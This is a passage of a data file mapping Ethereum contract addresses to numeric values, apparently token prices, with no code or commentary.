    "0xaaa7a10a8ee237ea61e8ac46c50a8db8bcc1baaa": 0.00956501,
    "0x001a8ffcb0f03e99141652ebcdecdb0384e3bd6c": 0.0098424,
    "0xaf9f549774ecedbd0966c52f250acc548d3f36e5": 0.00893621,
    "0xe5caef4af8780e59df925470b050fb23c43ca68c": 0.0241144,
    "0x3e9bc21c9b189c09df3ef1b824798658d5011937": 0.00827371,
    "0x4a7397b0b86bb0f9482a3f4f16de942f04e88702": 0.00933424,
    "0x1559fa1b8f28238fd5d76d9f434ad86fd20d1559": 0.103486,
    "0x62959c699a52ec647622c91e79ce73344e4099f5": 0.126488,
    "0x50de6856358cc35f3a9a57eaaa34bd4cb707d2cd": 0.00475194,
    "0xdef1ca1fb7fbcdc777520aa7f396b4e015f497ab": 0.114103,
    "0xbc4171f45ef0ef66e76f979df021a34b46dcc81d": 2.38,
    "0x662b67d00a13faf93254714dd601f5ed49ef2f51": 0.08258,
    "0xdc524e3c6910257744c1f93cf15e9f472b5bd236": 0.215983,
    "0xff44b937788215eca197baaf9af69dbdc214aa04": 0.03072897,
    "0x6b0b3a982b4634ac68dd83a4dbf02311ce324181": 0.02253127,
    "0xa1d0e215a23d7030842fc67ce582a6afa3ccab83": 521.95,
    "0xbaac2b4491727d78d2b78815144570b9f2fe8899": 0.00085449,
    "0xf001937650bb4f62b57521824b2c20f5b91bea05": 0.0014587,
    "0x80ce3027a70e0a928d9268994e9b85d03bd4cdcf": 0.02333781,
    "0x814e0908b12a99fecf5bc101bb5d0b8b5cdf7d26": 0.02370736,
    "0x0e192d382a36de7011f795acc4391cd302003606": 0.165643,
    "0x48c276e8d03813224bb1e55f953adb6d02fd3e02": 6.743e-9,
    "0x97872eafd79940c7b24f7bcc1eadb1457347adc9": 0.453367,
    "0xcf3c8be2e2c42331da80ef210e9b1b307c03d36a": 0.00121424,
    "0xe7f58a92476056627f9fdb92286778abd83b285f": 0.074,
    "0x9b39a0b97319a9bd5fed217c1db7b030453bac91": 0.00740466,
    "0x582d872a1b094fc48f5de31d3b73f2d9be47def1": 0.86042,
    "0x8c6bf16c273636523c29db7db04396143770f6a0": 0.00003964,
    "0xd31a59c85ae9d8edefec411d448f90841571b89c": 31,
    "0x04fa0d235c4abf4bcf4787af4cf447de572ef828": 2.68,
    "0x396ec402b42066864c406d1ac3bc86b575003ed8": 0.02074328,
    "0x4fb721ef3bf99e0f2c193847afa296b9257d3c30": 0.01228281,
    "0xed91879919b71bb6905f23af0a68d231ecf87b14": 0.01874967,
    "0x24e89bdf2f65326b94e36978a7edeac63623dafa": 0.00000219,
    "0x4691937a7508860f876c9c0a2a617e7d9e945d4b": 0.137491,
    "0x375abb85c329753b1ba849a601438ae77eec9893": 0.04640914,
    "0x2e10348ee563dec5fe483de558d1946b7a3372c2": 0.082149,
    "0x41e5560054824ea6b0732e656e3ad64e20e94e45": 0.129213,
    "0x9fa69536d1cda4a04cfb50688294de75b505a9ae": 0.306969,
    "0x419d0d8bdd9af5e606ae2232ed285aff190e711b": 0.0077005,
    "0x4c19596f5aaff459fa38b0f7ed92f11ae6543784": 0.058785,
    "0xa130e3a33a4d84b04c3918c4e5762223ae252f80": 0.02438312,
    "0xa117000000f279d81a1d3cc75430faa017fa5a2e": 1.68,
    "0x905e337c6c8645263d3521205aa37bf4d034e745": 0.00135489,
    "0xaaef88cea01475125522e117bfe45cf32044e238": 0.282461,
    "0x31c8eacbffdd875c74b94b077895bd78cf1e64a3": 1.58,
    "0xc581b735a1688071a1746c968e0798d642ede491": 1.057,
    "0xb9eefc4b0d472a44be93970254df4f4016569d27": 0.087027,
    "0xcafe001067cdef266afb7eb5a286dcfd277f3de5": 0.02523612,
    "0x5dd57da40e6866c9fcc34f4b6ddc89f1ba740dfe": 0.051421,
    "0x12bb890508c125661e03b09ec06e404bc9289040": 0.00034967,
    "0x5e74c9036fb86bd7ecdcb084a0673efc32ea31cb": 1102.9,
    "0x420412e765bfa6d85aaac94b4f7b708c89be2e2b": 0.195809,
    "0x16980b3b4a3f9d89e33311b5aa8f80303e5ca4f8": 0.064183,
    "0xd3e4ba569045546d09cf021ecc5dfe42b1d7f6e4": 0.339047,
    "0x91af0fbb28aba7e31403cb457106ce79397fd4e6": 0.107216,
    "0xbf2179859fc6d5bee9bf9158632dc51678a4100e": 0.134754,
    "0x26fb86579e371c7aedc461b2ddef0a8628c93d3b": 0.28683,
    "0xd4fa1460f537bb9085d22c7bccb5dd450ef28e3a": 0.103512,
    "0x4161725d019690a3e0de50f6be67b07a86a9fae1": 0.00635413,
    "0x7f39c581f595b53c5cb19bd0b3f8da6c935e2ca0": 1106.96,
    "0xd8912c10681d8b21fd3742244f44658dba12264e": 6.86,
    "0xaea46a60368a7bd060eec7df8cba43b7ef41ad85": 0.084231,
    "0x7bef710a5759d197ec0bf621c3df802c2d60d848": 0.0331017,
    "0xd9c2d319cd7e6177336b0a9c93c21cb48d84fb54": 6.42,
    "0x38e4adb44ef08f22f5b5b76a8f0c2d0dcbe7dca1": 0.24767,
    "0xdf2c7238198ad8b389666574f2d8bc411a4b7428": 0.00343918,
    "0x00c83aecc790e8a4453e5dd3b0b4b3680501a7a7": 0.054741,
    "0x74b988156925937bd4e082f0ed7429da8eaea8db": 0.00054062,
    "0xa31b1767e09f842ecfd4bc471fe44f830e3891aa": 0.00127965,
    "0x0258f474786ddfd37abce6df6bbb1dd5dfc4434a": 1.19,
    "0xa49d7499271ae71cd8ab9ac515e6694c755d400c": 0.136805,
    "0x081131434f93063751813c619ecca9c4dc7862a3": 0.307664,
    "0xea26c4ac16d4a5a106820bc8aee85fd0b7b2b664": 0.00948001,
    "0xc55c2175e90a46602fd42e931f62b3acc1a013ca": 0.01363181,
    "0xd85ad783cc94bd04196a13dc042a3054a9b52210": 0.01774309,
    "0x4e3fbd56cd56c3e72c1403e103b45db9da5b9d2b": 3.52,
    "0x471d113059324321749e097705197a2b44a070fc": 2.06,
    "0x9ad37205d608b8b219e6a2573f922094cec5c200": 0.02645542,
    "0x2edf094db69d6dcd487f1b3db9febe2eec0dd4c5": 0.02164997,
    "0x5eaa69b29f99c84fe5de8200340b4e9b4ab38eac": 0.00563116,
    "0x26c8afbbfe1ebaca03c2bb082e69d0476bffe099": 0.22931,
    "0x6c28aef8977c9b773996d0e8376d2ee379446f2f": 45.32,
    "0x1ceb5cb57c4d4e2b2433641b95dd330a33185a44": 103.75,
    "0x7825e833d495f3d1c28872415a4aee339d26ac88": 0.186102,
    "0x89bd2e7e388fab44ae88bef4e1ad12b4f1e0911c": 0.01519265,
    "0x22de9912cd3d74953b1cd1f250b825133cc2c1b3": 0.58878,
    "0xc0d4ceb216b3ba9c3701b291766fdcba977cec3a": 11.93,
    "0x80d55c03180349fff4a229102f62328220a96444": 0.104347,
    "0xeec2be5c91ae7f8a338e1e5f3b5de49d07afdc81": 139.05,
    "0x8fac8031e079f409135766c7d5de29cf22ef897c": 0.0072514,
    "0x6123b0049f904d730db3c36a31167d9d4121fa6b": 0.188335,
    "0x9f4909cc95fb870bf48c128c1fdbb5f482797632": 0.00000715,
    "0xb056c38f6b7dc4064367403e26424cd2c60655e1": 0.126267,
    "0xa91ac63d040deb1b7a5e4d4134ad23eb0ba07e14": 0.855506,
    "0x4688a8b1f292fdab17e9a90c8bc379dc1dbd8713": 9.17,
    "0x2ba592f78db6436527729929aaf6c908497cb200": 16.6,
    "0x3f382dbd960e3a9bbceae22651e88158d2791550": 1.36,
    "0xf34b1db61aca1a371fe97bad2606c9f534fb9d7d": 0.345207,
    "0x11eef04c884e24d9b7b4760e7476d06ddf797f36": 1.25,
    "0x544c42fbb96b39b21df61cf322b5edc285ee7429": 0.096915,
    "0x9355372396e3f6daf13359b7b607a3374cc638e0": 1.32,
    "0xac0104cca91d167873b8601d2e71eb3d4d8c33e0": 0.751531,
    "0xdf290b162a7d3e0a328cf198308d421954f08b94": 0.01312026,
    "0xcdf7028ceab81fa0c6971208e83fa7872994bee5": 0.03554975,
    "0x3d3d35bb9bec23b06ca00fe472b50e7a4c692c30": 0.058973,
    "0x0d438f3b5175bebc262bf23753c1e53d03432bde": 9.4,
    "0x4fe83213d56308330ec302a8bd641f1d0113a4cc": 0.165523,
    "0x85f6eb2bd5a062f5f8560be93fb7147e16c81472": 0.00060601,
    "0x474021845c4643113458ea4414bdb7fb74a01a77": 0.057015,
    "0xf6650117017ffd48b725b4ec5a00b414097108a7": 11.65,
    "0x80c62fe4487e1351b47ba49809ebd60ed085bf52": 0.094275,
    "0x4c11249814f11b9346808179cf06e71ac328c1b5": 1.91,
    "0xba8a621b4a54e61c442f5ec623687e2a942225ef": 1.69,
    "0x0f2d719407fdbeff09d87557abb7232601fd9f29": 0.514178,
    "0x95aa5d2dbd3c16ee3fdea82d5c6ec3e38ce3314f": 0.02315065,
    "0x0488401c3f535193fa8df029d9ffe615a06e74e6": 0.00032751,
    "0x5f98805a4e8be255a32880fdec7f6728c6568ba0": 1.01,
    "0xaa6e8127831c9de45ae56bb1b0d4d4da6e5665bd": 7.26,
    "0x5732046a883704404f284ce41ffadd5b007fd668": 0.091808,
    "0xcfeb09c3c5f0f78ad72166d55f9e6e9a60e96eec": 0.02419607,
    "0x7b32e70e8d73ac87c1b342e063528b2930b15ceb": 1.93188e-10,
    "0x6bb61215298f296c55b19ad842d3df69021da2ef": 0.238234,
    "0x8db1d28ee0d822367af8d220c0dc7cb6fe9dc442": 0.00561989,
    "0x9c4a4204b79dd291d6b6571c5be8bbcd0622f050": 0.03048131,
    "0x99fe3b1391503a1bc1788051347a1324bff41452": 0.209564,
    "0xac51066d7bec65dc4589368da368b212745d63e8": 2.04,
    "0x57b946008913b82e4df85f501cbaed910e58d26c": 0.01022007,
    "0xae12c5930881c53715b369cec7606b70d8eb229f": 0.487903,
    "0x850aab69f0e0171a9a49db8be3e71351c8247df4": 0.0316769,
    "0x16484d73ac08d2355f466d448d2b79d2039f6ebb": 0.01888046,
    "0x3496b523e5c00a4b4150d6721320cddb234c3079": 0.066031,
    "0x6e9730ecffbed43fd876a264c982e254ef05a0de": 0.353037,
    "0x4463e6a3ded0dbe3f6e15bc8420dfc55e5fea830": 0.467324,
    "0xa71d0588eaf47f12b13cf8ec750430d21df04974": 4.4387e-8,
    "0x9d0b65a76274645b29e4cc41b8f23081fa09f4a3": 0.00779779,
    "0x464ebe77c293e473b48cfe96ddcf88fcf7bfdac0": 0.322269,
    "0x476c5e26a75bd202a9683ffd34359c0cc15be0ff": 0.880955,
    "0x3593d125a4f7849a1b059e64f4517a86dd60c95d": 0.03645858,
    "0x9695e0114e12c0d3a3636fab5a18e6b737529023": 0.02999446,
    "0x3a880652f47bfaa771908c07dd8673a787daed3a": 0.799232,
    "0xb620be8a1949aa9532e6a3510132864ef9bc3f82": 0.0015766,
    "0xc6dddb5bc6e61e0841c54f3e723ae1f3a807260b": 16.17,
    "0x24ec2ca132abf8f6f8a6e24a1b97943e31f256a7": 0.01165325,
    "0xb26c4b3ca601136daf98593feaeff9e0ca702a8d": 0.03785043,
    "0xc690f7c7fcffa6a82b79fab7508c466fefdfc8c5": 0.0028,
    "0x1fe24f25b1cf609b9c4e7e12d802e3640dfa5e43": 0.124407,
    "0x4734baf528766ec4c420a6c13f8dba7bb1920181": 0.00162904,
    "0xdaf88906ac1de12ba2b1d2f7bfc94e9638ac40c4": 0.01661758,
    "0x2e85ae1c47602f7927bcabc2ff99c40aa222ae15": 0.00018502,
    "0xf433089366899d83a9f26a773d59ec7ecf30355e": 1.38,
    "0xeb986da994e4a118d5956b02d8b7c3c7ce373674": 0.01073687,
    "0xa01199c61841fce3b3dafb83fefc1899715c8756": 0.104728,
    "0x675bbc7514013e2073db7a919f6e4cbef576de37": 0.150002,
    "0x6399c842dd2be3de30bf99bc7d1bbf6fa3650e70": 0.553941,
    "0x8564653879a18c560e7c0ea0e084c516c62f5653": 0.00620583,
    "0x71ab77b7dbb4fa7e017bc15090b2163221420282": 1.26,
    "0x721a1b990699ee9d90b6327faad0a3e840ae8335": 0.720406,
    "0x320623b8e4ff03373931769a31fc52a4e78b5d70": 0.00653798,
    "0x38ec27c6f05a169e7ed03132bca7d0cfee93c2c5": 0.0001779,
    "0x9e46a38f5daabe8683e10793b06749eef7d733d1": 0.01786725,
    "0x06a00715e6f92210af9d7680b584931faf71a833": 0.03898695,
    "0x0fd10b9899882a6f2fcb5c371e17e70fdee00c38": 0.353456,
    "0x0202be363b8a4820f3f4de7faf5224ff05943ab1": 0.153346,
    "0xa487bf43cf3b10dffc97a9a744cbb7036965d3b9": 0.02162598,
    "0x888888888889c00c67689029d7856aac1065ec11": 0.156607,
    "0x9b02dd390a603add5c07f9fd9175b7dabe8d63b7": 2.64,
    "0x1122b6a0e00dce0563082b6e2953f3a943855c1f": 0.02897555,
    "0x5d285f735998f36631f678ff41fb56a10a4d0429": 0.00384499,
    "0x580c8520deda0a441522aeae0f9f7a5f29629afa": 0.802691,
    "0xc17c30e98541188614df99239cabd40280810ca3": 0.00037052,
    "0x72b886d09c117654ab7da13a14d603001de0b777": 0.139291,
    "0xe25bcec5d3801ce3a794079bf94adf1b8ccd802d": 0.0064733,
    "0x6f259637dcd74c767781e37bc6133cd6a68aa161": 5.33,
    "0x07bac35846e5ed502aa91adf6a9e7aa210f2dcbe": 0.00441443,
    "0x05d3606d5c81eb9b7b18530995ec9b29da05faba": 0.412723,
    "0xaa7a9ca87d3694b5755f213b5d04094b8d0f0a6f": 0.161341,
    "0x99ea4db9ee77acd40b119bd1dc4e33e1c070b80d": 0.02053285,
    "0x04abeda201850ac0124161f037efd70c74ddc74c": 0.03463475,
    "0xc666081073e8dff8d3d1c2292a29ae1a2153ec09": 0.0000232,
    "0x9040e237c3bf18347bb00957dc22167d0f2b999d": 0.053645,
    "0x25b24b3c47918b7962b3e49c4f468367f73cc0e0": 0.00007009,
    "0xd0929d411954c47438dc1d871dd6081f5c5e149c": 0.0053112,
    "0xaaaaaa20d9e0e2461697782ef11675f668207961": 1.29,
    "0xfe18be6b3bd88a2d2a7f928d00292e7a9963cfc6": 20779,
    "0x8f8221afbb33998d8584a2b05749ba73c37a938a": 0.082906,
    "0x674c6ad92fd080e4004b2312b45f796a192d27a0": 0.976902,
    "0x6069c9223e8a5da1ec49ac5525d4bb757af72cd8": 0.02694037,
    "0x0aa7efe4945db24d95ca6e117bba65ed326e291a": 0.0088,
    "0xed0d5747a9ab03a75fbfec3228cd55848245b75d": 0.670954,
    "0xcfcecfe2bd2fed07a9145222e8a7ad9cf1ccd22a": 1.85,
    "0x464fdb8affc9bac185a7393fd4298137866dcfb8": 0.04417893,
    "0xba9d4199fab4f26efe3551d490e3821486f135ba": 0.180084,
    "0xb0c7a3ba49c7a6eaba6cd4a96c55a1391070ac9a": 0.266038,
    "0xcb86c6a22cb56b6cf40cafedb06ba0df188a416e": 0.00305241,
    "0x89ab32156e46f46d02ade3fecbe5fc4243b9aaed": 0.19209,
    "0x595832f8fc6bf59c85c527fec3740a1b7a361269": 0.210049,
    "0xd9016a907dc0ecfa3ca425ab20b6b785b42f2373": 0.01087361,
    "0x056fd409e1d7a124bd7017459dfea2f387b6d5cd": 1.003,
    "0x2653891204f463fb2a2f4f412564b19e955166ae": 0.234638,
    "0xdddddd4301a082e62e84e43f474f044423921918": 1.4,
    "0xe4cfe9eaa8cdb0942a80b7bc68fd8ab0f6d44903": 0.02405657,
    "0x4c2e59d098df7b6cbae0848d66de2f8a4889b9c3": 0.03625116,
    "0xd567b5f02b9073ad3a982a099a23bf019ff11d1c": 0.162757,
    "0x746dda2ea243400d5a63e0700f190ab79f06489e": 0.04176907,
    "0x054f76beed60ab6dbeb23502178c52d6c5debe40": 0.01462174,
    "0x3106a0a076bedae847652f42ef07fd58589e001f": 0.121582,
    "0x8a6aca71a218301c7081d4e96d64292d3b275ce0": 0.051927,
    "0xfef4185594457050cc9c23980d301908fe057bb1": 0.162253,
    "0x9f284e1337a815fe77d2ff4ae46544645b20c5ff": 10.64,
    "0x865377367054516e17014ccded1e7d814edc9ce4": 1.015,
    "0x99295f1141d58a99e939f7be6bbe734916a875b8": 2.64,
    "0xe2f2a5c287993345a840db3b0845fbc70f5935a5": 0.999862,
    "0x8f693ca8d21b157107184d29d398a8d082b38b76": 0.02520561,
    "0x8c15ef5b4b21951d50e53e4fbda8298ffad25057": 0.159261,
    "0x7237c0b30b1355f1b76355582f182f6f04b08740": 0.02233974,
    "0xfcf8eda095e37a41e002e266daad7efc1579bc0a": 4.8,
    "0x3a8cccb969a61532d1e6005e2ce12c200caece87": 2.72,
    "0x41d5d79431a913c4ae7d69a668ecdfe5ff9dfb68": 82.88,
    "0xae78736cd615f374d3085123a210448e74fc6393": 1106.73,
    "0xf94b5c5651c888d928439ab6514b93944eee6f48": 0.107162,
    "0xf59ae934f6fe444afc309586cc60a84a0f89aaea": 1.7,
    "0x7e291890b01e5181f7ecc98d79ffbe12ad23df9e": 12.52,
    "0x20945ca1df56d237fd40036d47e866c7dccd2114": 0.01165113,
    "0x08d967bb0134f2d07f7cfb6e246680c53927dd30": 0.126788,
    "0x8b3870df408ff4d7c3a26df852d41034eda11d81": 0.328495,
    "0xc221b7e65ffc80de234bbb6667abdd46593d34f0": 0.210918,
    "0x9506d37f70eb4c3d79c398d326c871abbf10521d": 0.04175617,
    "0x65ef703f5594d2573eb71aaf55bc0cb548492df4": 3.27,
    "0xbe1a001fe942f96eea22ba08783140b9dcc09d28": 0.101524,
    "0xe95a203b1a91a908f9b9ce46459d101078c2c3cb": 935.86,
    "0x115ec79f1de567ec68b7ae7eda501b406626478e": 0.00394217,
    "0x2e95cea14dd384429eb3c4331b776c4cfbb6fcd9": 0.0139354,
    "0x2ee543b8866f46cc3dc93224c6742a8911a59750": 0.00093374,
    "0x1776e1f26f98b1a5df9cd347953a26dd3cb46671": 8.02,
    "0x431ad2ff6a9c365805ebad47ee021148d6f7dbe0": 0.03392872,
    "0x8185bc4757572da2a610f887561c32298f1a5748": 0.00461205,
    "0x29d578cec46b50fa5c88a99c6a4b70184c062953": 0.137802,
    "0x3212b29e33587a00fb1c83346f5dbfa69a458923": 21137,
    "0xdc8af07a7861bedd104b8093ae3e9376fc8596d2": 0.04045662,
    "0x410e731c2970dce3add351064acf5ce9e33fdbf0": 0.03515267,
    "0x2217e5921b7edfb4bb193a6228459974010d2198": 0.499938,
    "0x888888435fde8e7d4c54cab67f206e4199454c60": 0.562011,
    "0x47b9f01b16e9c9cb99191dca68c9cc5bf6403957": 0.02673636,
    "0x1fcdce58959f536621d76f5b7ffb955baa5a672f": 0.01538719,
    "0x51cb253744189f11241becb29bedd3f1b5384fdb": 0.03504046,
    "0x8971f9fd7196e5cee2c1032b50f656855af7dd26": 0.00125952,
    "0x011864d37035439e078d64630777ec518138af05": 0.02747722,
    "0x817bbdbc3e8a1204f3691d14bb44992841e3db35": 0.0102822,
    "0x446c9033e7516d820cc9a2ce2d0b7328b579406f": 0.02453046,
    "0xd291e7a03283640fdc51b121ac401383a46cc623": 5.28,
    "0x5cf04716ba20127f1e2297addcf4b5035000c9eb": 0.071149,
    "0xeeaa40b28a2d1b0b08f6f97bb1dd4b75316c6107": 0.23338,
    "0x43a96962254855f16b925556f9e97be436a43448": 0.01696761,
    "0x226bb599a12c826476e3a771454697ea52e9e220": 0.886487,
    "0xba50933c268f567bdc86e1ac131be072c6b0b71a": 0.02876721,
    "0x7995ab36bb307afa6a683c24a25d90dc1ea83566": 0.00000715,
    "0x7ca4408137eb639570f8e647d9bd7b7e8717514a": 0.022464,
    "0xe66747a101bff2dba3697199dcce5b743b454759": 3.98,
    "0x24e3794605c84e580eea4972738d633e8a7127c8": 0.01968778,
    "0xcb84d72e61e383767c4dfeb2d8ff7f4fb89abc6e": 1.3,
    "0x430ef9263e76dae63c84292c3409d61c598e9682": 3.31,
    "0x043c308bb8a5ae96d0093444be7f56459f1340b1": 0.01788012,
    "0xb70835d7822ebb9426b56543e391846c107bd32c": 0.00071169,
    "0x0c7d5ae016f806603cb1782bea29ac69471cab9c": 0.04610567,
    "0x42bbfa2e77757c645eeaad1655e0911a7553efbc": 0.294725,
    "0xf1ca9cb74685755965c7458528a36934df52a3ef": 0.272667,
    "0xdf574c24545e5ffecb9a659c229253d4111d87e1": 0.999227,
    "0x2af5d2ad76741191d15dfe7bf6ac92d4bd912ca3": 5,
    "0x6431fa4b812a2dcc062a38cb55cc7d18135adead": 0.01231563,
    "0xe1d7c7a4596b038ced2a84bf65b8647271c53208": 0.01758593,
    "0xbc19712feb3a26080ebf6f2f7849b417fdd792ca": 0.00996697,
    "0xa2120b9e674d3fc3875f415a7df52e382f141225": 0.183102,
    "0xfc98e825a2264d890f9a1e68ed50e1526abccacd": 4.81,
    "0x9f9c8ec3534c3ce16f928381372bfbfbfb9f4d24": 0.00143277,
    "0x0763fdccf1ae541a5961815c0872a8c5bc6de4d7": 0.083981,
    "0xe7f72bc0252ca7b16dbb72eeee1afcdb2429f2dd": 0.00880929,
    "0x6afcff9189e8ed3fcc1cffa184feb1276f6a82a5": 0.02031126,
    "0xaa602de53347579f86b996d2add74bb6f79462b2": 0.901748,
    "0x8287c7b963b405b7b8d467db9d79eec40625b13a": 0.00264318,
    "0xbf776e4fca664d791c4ee3a71e2722990e003283": 0.01196436,
    "0x9d65ff81a3c488d585bbfb0bfe3c7707c7917f54": 4.5,
    "0x2c974b2d0ba1716e644c1fc59982a89ddd2ff724": 0.012512,
    "0x70e8de73ce538da2beed35d14187f6959a8eca96": 0.725786,
    "0xff56cc6b1e6ded347aa0b7676c85ab0b3d08b0fa": 0.04051687,
    "0x1cf4592ebffd730c7dc92c1bdffdfc3b9efcf29a": 4.48,
    "0x0316eb71485b0ab14103307bf65a021042c6d380": 20486,
    "0x6c936d4ae98e6d2172db18c16c4b601c99918ee6": 0.00045307,
    "0x48783486ddd7fa85eca6b0c4ae8920bc25dfbcd7": 0.0142469,
    "0x65ccd72c0813ce6f2703593b633202a0f3ca6a0c": 0.01337998,
    "0x155040625d7ae3e9cada9a73e3e44f76d3ed1409": 0.067773,
    "0x2ba8349123de45e931a8c8264c332e6e9cf593f9": 0.01945957,
    "0x31ea0de8119307aa264bb4b38727aab4e36b074f": 0.0419593,
    "0x60f63b76e2fc1649e57a3489162732a90acf59fe": 0.00018043,
    "0x32a7c02e79c4ea1008dd6564b35f131428673c41": 0.78344,
    "0xaa2ce7ae64066175e0b90497ce7d9c190c315db4": 0.00071079,
    "0x986ee2b944c42d017f52af21c4c69b84dbea35d8": 0.201927,
    "0x12f649a9e821f90bb143089a6e56846945892ffb": 0.00142924,
    "0x728f30fa2f100742c7949d1961804fa8e0b1387d": 0.01798728,
    "0x1afb69dbc9f54d08dab1bd3436f8da1af819e647": 0.081157,
    "0x012e0e6342308b247f36ee500ecb14dc77a7a8c1": 0.00939487,
    "0xde4ee8057785a7e8e800db58f9784845a5c2cbd6": 2.66,
    "0x9e04f519b094f5f8210441e285f603f4d2b50084": 0.0057201,
    "0x3a4cab3dcfab144fe7eb2b5a3e288cc03dc07659": 0.02030223,
    "0x51db5ad35c671a87207d88fc11d593ac0c8415bd": 0.121584,
    "0x08389495d7456e1951ddf7c3a1314a4bfb646d8b": 0.139321,
    "0x07c52c2537d84e532a9f15d32e152c8b94d2b232": 3.36,
    "0x4cff49d0a19ed6ff845a9122fa912abcfb1f68a6": 0.01980197,
    "0xf55a93b613d172b86c2ba3981a849dae2aecde2f": 0.03115534,
    "0x05fb86775fd5c16290f1e838f5caaa7342bd9a63": 0.01349478,
    "0x321c2fe4446c7c963dc41dd58879af648838f98d": 4.53,
    "0x75231f58b43240c9718dd58b4967c5114342a86c": 11.27,
    "0x6f87d756daf0503d08eb8993686c7fc01dc44fb1": 0.0371281,
    "0x871baed4088b863fd6407159f3672d70cd34837d": 5.5,
    "0xa0bed124a09ac2bd941b10349d8d224fe3c955eb": 0.146605,
    "0x1a3496c18d558bd9c6c8f609e1b129f67ab08163": 0.01652452,
    "0x6251e725cd45fb1af99354035a414a2c0890b929": 0.00100724,
    "0x5d30ad9c6374bf925d0a75454fa327aacf778492": 0.092609,
    "0x8e0fe2947752be0d5acf73aae77362daf79cb379": 0.17355,
    "0xeca82185adce47f39c684352b0439f030f860318": 0.01473778,
    "0xd714d91a169127e11d8fab3665d72e8b7ef9dbe2": 0.00401945,
    "0xc8c424b91d8ce0137bab4b832b7f7d154156ba6c": 0.01194643,
    "0xc4c7ea4fab34bd9fb9a5e1b1a98df76e26e6407c": 0.656991,
    "0x03d1e72765545729a035e909edd9371a405f77fb": 0.00000859,
    "0x286bda1413a2df81731d4930ce2f862a35a609fe": 0.0359702,
    "0xd85a6ae55a7f33b0ee113c234d2ee308edeaf7fd": 0.865643,
    "0x441761326490cacf7af299725b6292597ee822c2": 5.71,
    "0x653430560be843c4a3d143d0110e896c2ab8ac0d": 0.00025246,
    "0x0e5f00da8aaef196a719d045db89b5da8f371b32": 0.146032,
    "0x7d8daff6d70cead12c6f077048552cf89130a2b1": 0.0019532,
    "0xc40f23a3e9613e012944f7957edce97899fa920d": 0.00613864,
    "0x773258b03c730f84af10dfcb1bfaa7487558b8ac": 0.00319059,
    "0x3a4f40631a4f906c2bad353ed06de7a5d3fcb430": 0.344776,
    "0x5d3a4f62124498092ce665f865e0b38ff6f5fbea": 0.03700707,
    "0x3c2a309d9005433c1bc2c92ef1be06489e5bf258": 0.246719,
    "0xc775c0c30840cb9f51e21061b054ebf1a00acc29": 0.00088052,
    "0xa849eaae994fb86afa73382e9bd88c2b6b18dc71": 0.00434252,
    "0xf66cd2f8755a21d3c8683a10269f795c0532dd58": 0.991707,
    "0x00aba6fe5557de1a1d565658cbddddf7c710a1eb": 0.425874,
    "0x965697b4ef02f0de01384d0d4f9f782b1670c163": 0.078269,
    "0xec5483804e637d45cde22fa0869656b64b5ab1ab": 0.0228618,
    "0xfb62ae373aca027177d1c18ee0862817f9080d08": 0.162405,
    "0x2c537e5624e4af88a7ae4060c022609376c8d0eb": 0.057267,
    "0x85f138bfee4ef8e540890cfb48f620571d67eda3": 16.38,
    "0x0de05f6447ab4d22c8827449ee4ba2d5c288379b": 0.00399379,
    "0x0407b4c4eaed35ce3c5b852bdfa1640b09eeedf4": 0.175067,
    "0x3a856d4effa670c54585a5d523e96513e148e95d": 1.29,
    "0x979aca85ba37c675e78322ed5d97fa980b9bdf00": 0.240371,
    "0xfc82bb4ba86045af6f327323a46e80412b91b27d": 3.08,
    "0x4674672bcddda2ea5300f5207e1158185c944bc0": 0.133388,
    "0xa02120696c7b8fe16c09c749e4598819b2b0e915": 0.01041588,
    "0xde5ed76e7c05ec5e4572cfc88d1acea165109e44": 67.36,
    "0x9ab70e92319f0b9127df78868fd3655fb9f1e322": 0.02748982,
    "0xd01409314acb3b245cea9500ece3f6fd4d70ea30": 0.079786,
    "0xaad483f97f13c6a20b9d05d07c397ce85c42c393": 0.04533082,
    "0xc64500dd7b0f1794807e67802f8abbf5f8ffb054": 0.085531,
    "0x75858677e27c930fb622759feaffee2b754af07f": 0.234557,
    "0x3a0b022f32b3191d44e5847da12dc0b63fb07c91": 0.0044671,
    "0xde4ce5447ce0c67920a1371605a39187cb6847c8": 0.00500489,
    "0xf59257e961883636290411c11ec5ae622d19455e": 2.61,
    "0x3d371413dd5489f3a04c07c0c2ce369c20986ceb": 0.498364,
    "0x968f6f898a6df937fc1859b323ac2f14643e3fed": 0.06898,
    "0x666d875c600aa06ac1cf15641361dec3b00432ef": 4.51,
    "0xcc1a8bd438bebc4b2a885a34475bb974f2124317": 0.156488,
    "0x2001f2a0cf801ecfda622f6c28fb6e10d803d969": 15.93,
    "0x4a8f5f96d5436e43112c2fbc6a9f70da9e4e16d4": 1.43,
    "0x8fc8f8269ebca376d046ce292dc7eac40c8d358a": 1.073,
    "0x74232704659ef37c08995e386a2e26cc27a8d7b1": 20.1,
    "0xdd2a36ae937bc134ea694d77fc7e2e36f5d86de0": 0.01660166,
    "0xf4134146af2d511dd5ea8cdb1c4ac88c57d60404": 0.01989689,
    "0xeb6026d3beaa308d5822c44cdd2ca8c7714237ec": 0.00184695,
    "0xc07a150ecadf2cc352f5586396e344a6b17625eb": 0.00903505,
    "0xe74be071f3b62f6a4ac23ca68e5e2a39797a3c30": 1.27,
    "0x081f67afa0ccf8c7b17540767bbe95df2ba8d97f": 0.03200456,
    "0xeadc218ac4cb7895a5a56e6484646b48f841c45a": 49.56,
    "0xd3c51de3e6dd9b53d7f37699afb3ee3bf9b9b3f4": 2.599e-9,
    "0xb4371da53140417cbb3362055374b10d97e420bb": 0.00411085,
    "0xc29acac647c63dbd8618e817d41ea9de69174ae1": 135,
    "0x667102bd3413bfeaa3dffb48fa8288819e480a88": 3.13,
    "0xba6b0dbb2ba8daa8f5d6817946393aef8d3a4487": 0.583575,
    "0x5dc60c4d5e75d22588fa17ffeb90a63e535efce0": 0.04740916,
    "0x6e5970dbd6fc7eb1f29c6d2edf2bc4c36124c0c1": 0.056301,
    "0x579cea1889991f68acc35ff5c3dd0621ff29b0c9": 0.0041845,
    "0xd13cfd3133239a3c73a9e535a5c4dadee36b395c": 0.01023589,
    "0x7c9f4c87d911613fe9ca58b579f737911aad2d43": 0.391791,
    "0x1c48f86ae57291f7686349f12601910bd8d470bb": 0.998822,
    "0x4297394c20800e8a38a619a243e9bbe7681ff24e": 0.03088866,
    "0x55af5865807b196bd0197e0902746f31fbccfa58": 2.11,
    "0x68749665ff8d2d112fa859aa293f07a622782f38": 1857.55,
    "0xfc1cb4920dc1110fd61afab75cf085c1f871b8c6": 0.199029,
    "0x3b58c52c03ca5eb619eba171091c86c34d603e5f": 0.00564312,
    "0xadd5e881984783dd432f80381fb52f45b53f3e70": 0.02099761,
